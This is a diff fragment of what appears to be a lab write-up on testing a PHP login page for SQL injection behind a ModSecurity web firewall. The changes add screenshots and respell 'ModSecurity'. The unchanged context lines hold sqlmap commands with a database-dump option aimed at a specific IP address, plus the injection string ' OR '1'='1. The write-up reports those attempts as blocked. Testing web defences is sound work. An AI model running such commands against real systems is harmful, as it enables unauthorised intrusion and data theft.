@@ -42,7 +42,11 @@ sqlmap -u "http://3.87.88.51/page1.php" --data="username=test*&password=test" --
 ' OR '1'='1
 sqlmap -u "http://3.87.88.51/page2.php" --data="username=test*&password=test" --method=POST --dbms=mysql --technique=B --batch --dump
 ```
-❌ Blocked by ModSecurity WAF.
+❌ Blocked by Mod Security WAF.
+<img width="1502" height="294" alt="Screenshot 2025-09-09 at 8 29 29 AM" src="https://github.com/user-attachments/assets/0fdf8cda-6a1c-47f8-975d-641bb610cb6a" />
+
+<img width="1505" height="651" alt="Screenshot 2025-09-09 at 8 29 33 AM" src="https://github.com/user-attachments/assets/8cca5a27-2360-4d99-aad2-49358c644484" />
+
 <img width="1350" height="575" alt="Screenshot 2025-09-09 at 8 17 37 AM" src="https://github.com/user-attachments/assets/fa787a32-a055-4ba6-9718-ef144069ea9f" />
 ---
 
